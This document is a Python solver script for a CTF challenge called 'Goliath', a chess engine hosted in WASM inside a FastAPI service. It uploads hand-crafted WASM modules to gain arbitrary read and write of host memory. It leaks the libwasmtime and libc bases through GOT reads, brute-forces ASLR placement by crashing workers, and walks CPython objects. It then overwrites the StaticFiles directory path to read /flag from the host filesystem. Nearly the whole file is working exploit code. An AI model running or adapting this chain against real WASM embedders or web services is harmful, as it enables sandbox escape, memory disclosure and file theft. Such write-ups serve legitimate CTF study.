#!/usr/bin/env python3
"""Goliath full solver: WASM host-memory R/W -> StaticFiles data-only escape -> /flag."""

from __future__ import annotations

import argparse
import ctypes
import importlib.util
import json
import pathlib
import tempfile
import time
import urllib.error
import urllib.parse
import urllib.request
import zipfile
from typing import Any

from robust_walk import make_walk

MASK64 = (1 << 64) - 1
GRID = 0x04000000
ANCHOR_INPUT = 0
ANCHOR_TARGET = 48
RETURN_ADDRESS_INPUT = 3128
RETURN_ADDRESS_TARGET = 0x168A568
LIBWASMTIME_GOT_OFFSET = 0x16EAB90
LIBC_GOT_TARGET = 0x3DF40
PLACEMENT_BASE = 0x206000000
PYRUNTIME = 0xA5C1C0
FINISH_REPLACEMENT = b"x b /../../.."
DEFAULT_SWEEP = (2, 4, 0, 6, 3, 5, 1, 7, 8)

# Unified reader/writer. First request returns a host pointer relative to the module's
# linear-memory base. A specially shaped request arms a one-shot eight-byte write; the
# next request supplies the bytes copied by the embedder before best_move() performs it.
UNIFIED_WASM = bytes.fromhex(
    "0061736d010000000105016000017e0303020000050401010164060b027e0142100b7f0141000b0723"
    "03066d656d6f727902000a66656e5f627566666572000009626573745f6d6f766500010a2a02040023"
    "000b230023010440410024014210240005411c2903002400412428020024010b41142903000b001304"
    "6e616d65070c0200027774010561726d6564"
)

# Simpler reader used by the architecture-independent local host-memory self-check.
READER_WASM = bytes.fromhex(
    "0061736d010000000109026000017f6000017e0303020001050401010164072303066d656d6f727902"
    "000a66656e5f627566666572000009626573745f6d6f766500010a0e02040041100b07004114290300"
    "0b"
)


class Live:
    """HTTP transport for the crash-sweep and unified memory primitive."""

    def __init__(self, url: str) -> None:
        self.url = url.rstrip("/")

    def root_state(self) -> str:
        """Distinguish a live app from a crashed worker and an expired CTF instance."""
        try:
            response = urllib.request.urlopen(self.url + "/", timeout=4)
            return "up" if response.status == 200 else "error"
        except urllib.error.HTTPError as error:
            try:
                body = error.read()
            except Exception:
                body = b""
            return "expired" if b"Instance down" in body else "error"
        except Exception:
            return "error"

    def upload(self, wasm: bytes = UNIFIED_WASM) -> dict[str, Any]:
        """Upload a WASM module without an HTTP dependency beyond urllib."""
        boundary = "----goliath"
        body = (
            (
                f'--{boundary}\r\nContent-Disposition: form-data; name="file"; '
                'filename="escape.wasm"\r\nContent-Type: application/wasm\r\n\r\n'
            ).encode()
            + wasm
            + f"\r\n--{boundary}--\r\n".encode()
        )
        request = urllib.request.Request(
            self.url + "/api/upload",
            data=body,
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        )
        response = urllib.request.urlopen(request, timeout=20)
        return json.loads(response.read())

    def fen(self, fen: bytes) -> tuple[bytes, int]:
        """Send arbitrary latin-1 FEN bytes and return best_move bytes plus status."""
        query = urllib.parse.quote(fen.decode("latin-1"), safe="")
        for attempt in range(2):
            try:
                response = urllib.request.urlopen(
                    f"{self.url}/api/best-move?fen={query}", timeout=6
                )
                body = json.loads(response.read())
                return body.get("best_move", "").encode("latin-1"), 200
            except urllib.error.HTTPError as error:
                return b"", error.code
            except Exception:
                time.sleep(0.4 * (attempt + 1))
        return b"", 502

    def read_string(self, offset: int) -> tuple[bytes, int]:
        """Read a NUL-terminated host string at ``badger_base + offset``."""
        fen = (
            b"x b "
            + (offset & MASK64).to_bytes(8, "little")
            + (16).to_bytes(8, "little")
            + (0).to_bytes(4, "little")
        )
        return self.fen(fen)

    def read_qword(self, offset: int) -> tuple[int | None, int]:
        """Read a canonical six-byte userspace pointer despite embedded NUL bytes."""
        output = bytearray(8)
        index = 0
        while index < 6:
            string, status = self.read_string(offset + index)
            if status != 200:
                return None, status
            if not string:
                index += 1
                continue
            count = len(string)
            for inner in range(min(count, 6 - index)):
                output[index + inner] = string[inner]
            index += count
            if index < 6:
                index += 1
        return int.from_bytes(output, "little"), 200


def absolute_write(live: Live, badger_base: int, address: int, data: bytes) -> None:
    """Write bytes to an absolute host address with the unified WASM module."""
    if len(data) > 255:
        raise ValueError("FEN transport is limited to 255 bytes")
    offset = (address - badger_base) & MASK64
    _body, status = live.fen(
        b"x b "
        + (8).to_bytes(8, "little")
        + offset.to_bytes(8, "little")
        + (1).to_bytes(4, "little")
    )
    if status != 200:
        raise RuntimeError(f"failed to arm absolute write: HTTP {status}")
    _body, status = live.fen(data)
    if status not in {200, 422}:
        raise RuntimeError(f"absolute write trigger failed: HTTP {status}")


def wait_and_upload(live: Live, *, patient_expiry: bool, tries: int = 40) -> bool:
    """Wait for a restarted worker and install the unified module again."""
    for _ in range(tries):
        state = live.root_state()
        if state == "up":
            try:
                result = live.upload()
                if result.get("status") == "ok":
                    return True
            except Exception:
                pass
        elif state == "expired" and not patient_expiry:
            print("[!] instance expired; relaunch it on the CTF platform")
            return False
        time.sleep(1.5)
    return False


def leak_attempt(live: Live, slot: int) -> tuple[dict[str, int] | None, str]:
    """Try one placement slot and validate the derived libc base by ELF magic."""
    offset = PLACEMENT_BASE + slot * GRID
    anchor, status = live.read_qword(offset + ANCHOR_INPUT)
    if status != 200 or anchor is None:
        return None, f"HTTP {status}@anchor"
    badger = anchor - offset - ANCHOR_TARGET
    return_address, status = live.read_qword(offset + RETURN_ADDRESS_INPUT)
    if status != 200 or return_address is None:
        return None, f"HTTP {status}@return-address"
    libwasmtime = return_address - RETURN_ADDRESS_TARGET
    got_address = libwasmtime + LIBWASMTIME_GOT_OFFSET
    got_value, status = live.read_qword((got_address - badger) & MASK64)
    if status != 200 or got_value is None:
        return None, f"HTTP {status}@GOT"
    libc = got_value - LIBC_GOT_TARGET
    magic = bytearray(4)
    for index in range(4):
        string, status = live.read_string((libc - badger + index) & MASK64)
        if status != 200:
            return None, f"HTTP {status}@ELF"
        magic[index] = string[0] if string else 0
    if bytes(magic) != b"\x7fELF":
        return None, f"bad ELF magic {bytes(magic)!r}"
    return {
        "slot": slot,
        "placement_offset": offset,
        "badger": badger,
        "libwasmtime": libwasmtime,
        "libc": libc,
    }, "validated"


def locate_directory_string(live: Live, badger: int) -> int:
    """Walk live CPython objects to the first StaticFiles directory's string data."""

    def relative(address: int) -> int:
        return (address - badger) & MASK64

    def read_qword(address: int) -> int | None:
        value, status = live.read_qword(relative(address))
        return value if status == 200 else None

    def read_string(address: int) -> bytes | None:
        value, status = live.read_string(relative(address))
        return value if status == 200 else None

    def read_byte(address: int) -> int | None:
        value = read_string(address)
        return value[0] if value else 0

    def plausible(pointer: int | None) -> bool:
        if pointer is None:
            return False
        # The Debian python3.11 executable is non-PIE: interpreter/runtime objects can
        # live in its low 0x0040_0000.. range, while ordinary heap objects use ASLR.
        return 0x00400000 <= pointer < 0x02000000 or (
            0x0000500000000000 <= pointer < 0x0000800000000000
        )

    directory, why = make_walk(read_qword, read_string, read_byte, plausible)()
    if directory is None:
        raise RuntimeError(f"CPython object walk failed: {why}")
    print(f"[walk] StaticFiles directory bytes at {directory:#x}")
    return directory


def finish_read_flag(live: Live, badger: int, directory_data: int) -> str:
    """Retarget StaticFiles to the filesystem root and fetch the host's /flag."""
    absolute_write(live, badger, directory_data, FINISH_REPLACEMENT)
    try:
        response = urllib.request.urlopen(live.url + "/flag", timeout=20)
        body = response.read().decode("latin-1", "replace")
    except urllib.error.HTTPError as error:
        body = error.read().decode("latin-1", "replace")
        raise RuntimeError(f"GET /flag failed: HTTP {error.code}: {body[:500]}") from error
    print(f"[finish] GET /flag -> {body.strip()}")
    if "avito{" not in body:
        raise RuntimeError("StaticFiles escape returned no flag")
    return body


def run_full_live(
    url: str,
    sweep: tuple[int, ...],
    max_instances: int,
    wait_for_launch: bool,
) -> None:
    """Crash-sweep ASLR placements, then perform the data-only filesystem escape."""
    live = Live(url)
    print(f"[*] target={url}; placement sweep={sweep}")
    if wait_for_launch:
        print("[*] waiting for the CTF instance to become live")
        while live.root_state() != "up":
            time.sleep(5)
    for attempt in range(max_instances):
        slot = sweep[attempt % len(sweep)]
        if not wait_and_upload(live, patient_expiry=wait_for_launch):
            raise RuntimeError("target did not become ready")
        leak, why = leak_attempt(live, slot)
        print(f"[instance {attempt:02d}] slot={slot}: {why}")
        if leak is None:
            continue
        print("[leak]", json.dumps({key: hex(value) for key, value in leak.items()}, indent=2))
        directory = locate_directory_string(live, leak["badger"])
        finish_read_flag(live, leak["badger"], directory)
        return
    raise RuntimeError("placement sweep exhausted without a validated host leak")


def run_primitive_live(url: str) -> None:
    """Safely prove the upload/read transport without an out-of-bounds crash sweep."""
    live = Live(url)
    print("[upload]", live.upload(READER_WASM))
    value, status = live.fen(b"x b " + (64).to_bytes(8, "little"))
    print(f"[read] own linear memory +64 -> HTTP {status}, {value!r}")
    if status != 200:
        raise RuntimeError("safe primitive check failed")


def run_local_selfcheck() -> None:
    """Verify arbitrary host-memory disclosure against the archived original service."""
    from fastapi.testclient import TestClient

    archive_path = pathlib.Path(__file__).with_name("goliath_c8c718c.zip")
    with tempfile.TemporaryDirectory(prefix="goliath-selfcheck-") as directory:
        app_dir = pathlib.Path(directory) / "goliath"
        (app_dir / "web" / "dist").mkdir(parents=True)
        with zipfile.ZipFile(archive_path) as archive:
            for relative in ("mcu-max.py", "mcu-max.wasm", "web/dist/index.html"):
                (app_dir / relative).write_bytes(archive.read("goliath/" + relative))
        spec = importlib.util.spec_from_file_location("goliath_challenge", app_dir / "mcu-max.py")
        if spec is None or spec.loader is None:
            raise ImportError("cannot load archived challenge service")
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        client = TestClient(module.APP)

        secret = b"AVITO_HOST_SECRET_selfcheck"
        object_address = id(secret)
        object_window = bytes((ctypes.c_char * 64).from_address(object_address))
        secret_address = object_address + object_window.find(secret)
        response = client.post(
            "/api/upload",
            files={"file": ("reader.wasm", READER_WASM, "application/wasm")},
        )
        response.raise_for_status()
        badger = ctypes.addressof(module.BADGER_PLAYER._Player__memory.contents)  # noqa: SLF001
        raw = b"x b " + ((secret_address - badger) & MASK64).to_bytes(8, "little")
        leaked = client.get("/api/best-move", params={"fen": raw.decode("latin-1")}).json()[
            "best_move"
        ]
        assert leaked.encode("latin-1") == secret
        print("SELF-CHECK OK: archived original service disclosed host CPython memory")


def main() -> None:
    """CLI entry point."""
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", help="live challenge base URL")
    parser.add_argument("--full", action="store_true", help="run crash-sweep and fetch /flag")
    parser.add_argument("--max-instances", type=int, default=30)
    parser.add_argument("--sweep", default=",".join(map(str, DEFAULT_SWEEP)))
    parser.add_argument("--wait-for-launch", action="store_true")
    args = parser.parse_args()
    if not args.url:
        run_local_selfcheck()
        return
    if not args.full:
        run_primitive_live(args.url)
        print("[i] pass --full to run the crash-sweep and complete /flag escape")
        return
    sweep = tuple(int(item) for item in args.sweep.split(",") if item)
    if not sweep:
        parser.error("--sweep must contain at least one integer slot")
    run_full_live(args.url, sweep, args.max_instances, args.wait_for_launch)


if __name__ == "__main__":
    main()
